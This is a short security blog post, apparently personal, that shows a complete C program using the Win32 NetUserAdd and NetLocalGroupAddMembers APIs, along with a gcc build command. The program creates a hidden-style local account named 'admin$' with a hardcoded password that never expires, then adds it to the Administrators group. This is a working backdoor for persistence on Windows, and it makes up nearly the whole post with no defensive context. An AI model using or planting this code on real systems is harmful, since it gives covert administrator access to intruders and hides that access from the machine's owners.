---
author: XhstormR
tags:
  - security
date: 2019-10-01T09:59:16+08:00
title: Win32 NetUserAdd API
---

<!--more-->

Updated on 2019-10-01

> https://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd

```c
#include <windows.h>
#include <stdio.h>
#include <lm.h>

int main(int agrc, char *agrv[]) {
  USER_INFO_1 user;
  memset(&user, 0, sizeof(user));
  user.usri1_name = L"admin$";
  user.usri1_password = L"Leoasdzxc123.";
  user.usri1_priv = USER_PRIV_USER;
  user.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT | UF_DONT_EXPIRE_PASSWD;
  user.usri1_comment = NULL;
  user.usri1_home_dir = NULL;
  user.usri1_script_path = NULL;

  LOCALGROUP_MEMBERS_INFO_3 member;
  memset(&member, 0, sizeof(member));
  member.lgrmi3_domainandname = user.usri1_name;

  if (NetUserAdd(NULL, 1, (void *)&user, NULL) != NERR_Success) {
    puts("NetUserAdd FAILED!");
    return -1;
  }

  if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (void *)&member, 1) != NERR_Success) {
    puts("NetLocalGroupAddMembers FAILED!");
    return -1;
  }

  return 0;
}
```

```bash
gcc 123.c -lnetapi32 -s
```
